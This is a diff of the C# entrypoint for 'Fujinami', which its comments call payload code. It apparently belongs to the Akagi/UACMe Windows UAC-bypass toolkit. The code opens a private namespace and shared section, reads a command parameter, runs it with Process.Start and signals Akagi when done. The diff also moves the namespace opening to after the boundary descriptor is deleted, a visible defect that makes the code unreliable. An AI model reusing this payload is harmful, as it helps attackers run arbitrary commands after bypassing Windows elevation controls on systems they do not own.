@@ -2,12 +2,14 @@
 *
 *  (C) COPYRIGHT AUTHORS, 2018
 *
-*  TITLE:       FUJINAMI.CS
+*  TITLE:       ENTRYPOINT.CS
 *
 *  VERSION:     3.10
 *
 *  DATE:        13 Nov 2018
 *
+*  Fujinami entrypoint.
+* 
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
 * TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
@@ -22,7 +24,7 @@ using System.Runtime.InteropServices;
 //
 // Fujinami payload code
 //
-// Read registry value with custom parameter and execute it.
+// Read shared parameters block, use custom parameter value and execute it.
 //
 namespace Fujinami
 {
@@ -35,8 +37,9 @@ namespace Fujinami
         {
             try
             {
-                Debug.Write("Ready, fire!");
-
+                //
+                // Create boundary descriptor.
+                //
                 bool bSharedParamsReadOk = false;
                 IntPtr BoundaryDescriptor = NativeMethods.CreateBoundaryDescriptorW("ArisuTsuberuku", 0);
                 if (BoundaryDescriptor == IntPtr.Zero)
@@ -46,40 +49,49 @@ namespace Fujinami
                 IntPtr pSid = IntPtr.Zero;
                 uint cbSid = 0;
 
-                NativeMethods.CreateWellKnownSid(NativeMethods.WELL_KNOWN_SID_TYPE.WinWorldSid, domainSid, pSid, ref cbSid);
+                NativeMethods.CreateWellKnownSid(WELL_KNOWN_SID_TYPE.WinWorldSid, domainSid, pSid, ref cbSid);
 
                 pSid = Marshal.AllocHGlobal(Convert.ToInt32(cbSid));
 
                 if (!NativeMethods.CreateWellKnownSid(
-                        NativeMethods.WELL_KNOWN_SID_TYPE.WinWorldSid,
+                        WELL_KNOWN_SID_TYPE.WinWorldSid,
                         domainSid,
                         pSid,
                         ref cbSid))
                 {
+                    Marshal.FreeHGlobal(pSid);
                     return;
                 }
 
                 if (!NativeMethods.AddSIDToBoundaryDescriptor(ref BoundaryDescriptor, pSid))
+                {
+                    Marshal.FreeHGlobal(pSid);
                     return;
-
-                IntPtr hPrivateNamespace = NativeMethods.OpenPrivateNamespaceW(BoundaryDescriptor, "AkagiIsoSpace");
+                }
 
                 Marshal.FreeHGlobal(pSid);
                 NativeMethods.DeleteBoundaryDescriptor(BoundaryDescriptor);
 
+                //
+                // Open Akagi namespace.
+                //
+                IntPtr hPrivateNamespace = NativeMethods.OpenPrivateNamespaceW(BoundaryDescriptor, "AkagiIsoSpace");
                 if (hPrivateNamespace == IntPtr.Zero)
                     return;
 
                 IntPtr hSection = IntPtr.Zero;
 
-                NativeMethods.OBJECT_ATTRIBUTES oa = new NativeMethods.OBJECT_ATTRIBUTES(
+                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES(
                     "AkagiSharedSection",
-                    NativeMethods.ObjectFlags.CaseInsensitive,
+                    ObjectFlags.CaseInsensitive,
                     hPrivateNamespace);
 
-                NativeMethods.NtStatus Status = NativeMethods.NtOpenSection(
+                //
+                // Read shared parameters block.
+                //
+                NtStatus Status = NativeMethods.NtOpenSection(
                     out hSection,
-                    NativeMethods.SectionAccess.MapRead,
+                    SectionAccess.MapRead,
                     ref oa);
 
                 if (NativeMethods.IsSuccess(Status))
@@ -96,23 +108,26 @@ namespace Fujinami
                         new IntPtr(0x1000),
                         ref sectionOffset,
                         ref ViewSize,
-                        NativeMethods.SectionInherit.ViewUnmap,
-                        NativeMethods.MemoryFlags.TopDown,
-                        NativeMethods.MemoryProtection.ReadOnly);
+                        SectionInherit.ViewUnmap,
+                        MemoryFlags.TopDown,
+                        MemoryProtection.ReadOnly);
 
                     if (NativeMethods.IsSuccess(Status))
                     {
-                        Int32 StructSize = Marshal.SizeOf(typeof(NativeMethods.SHARED_PARAMS));
+                        int StructSize = Marshal.SizeOf(typeof(SHARED_PARAMS));
                         byte[] rawData = new byte[StructSize];
                         Marshal.Copy(BaseAddress, rawData, 0, StructSize);
 
-                        NativeMethods.SHARED_PARAMS SharedParams = (NativeMethods.SHARED_PARAMS)
+                        SHARED_PARAMS SharedParams = (SHARED_PARAMS)
                             Marshal.PtrToStructure(
                                 Marshal.UnsafeAddrOfPinnedArrayElement(rawData, 0),
-                                typeof(NativeMethods.SHARED_PARAMS));
+                                typeof(SHARED_PARAMS));
 
                         NativeMethods.NtUnmapViewOfSection(hSection, BaseAddress);
 
+                        //
+                        // Validate data.
+                        //
                         var Crc32 = SharedParams.Crc32;
                         SharedParams.Crc32 = 0;
 
@@ -124,6 +139,9 @@ namespace Fujinami
 
                         Marshal.FreeHGlobal(StructPtr);
 
+                        //
+                        // Run custom parameter.
+                        //
                         var PayloadToExecute = string.Empty;
 
                         if (bSharedParamsReadOk)
@@ -136,16 +154,19 @@ namespace Fujinami
 
                         Process.Start(PayloadToExecute);
 
+                        //
+                        // Notify Akagi about completion.
+                        //
                         if (bSharedParamsReadOk)
                         {
                             IntPtr hEvent = IntPtr.Zero;
 
-                            NativeMethods.OBJECT_ATTRIBUTES oae = new NativeMethods.OBJECT_ATTRIBUTES(
+                            OBJECT_ATTRIBUTES oae = new OBJECT_ATTRIBUTES(
                                 SharedParams.szSignalObject,
-                                NativeMethods.ObjectFlags.CaseInsensitive,
+                                ObjectFlags.CaseInsensitive,
                                 hPrivateNamespace);
 
-                            Status = NativeMethods.NtOpenEvent(out hEvent, NativeMethods.EventAccess.AllAccess, ref oae);
+                            Status = NativeMethods.NtOpenEvent(out hEvent, EventAccess.AllAccess, ref oae);
                             if (NativeMethods.IsSuccess(Status))
                             {
                                 int prev = 0;
@@ -162,8 +183,6 @@ namespace Fujinami
             {
                 Environment.Exit(0);
             }
-
-            Debug.Write("Bye!");
 
             Environment.Exit(0);
         }
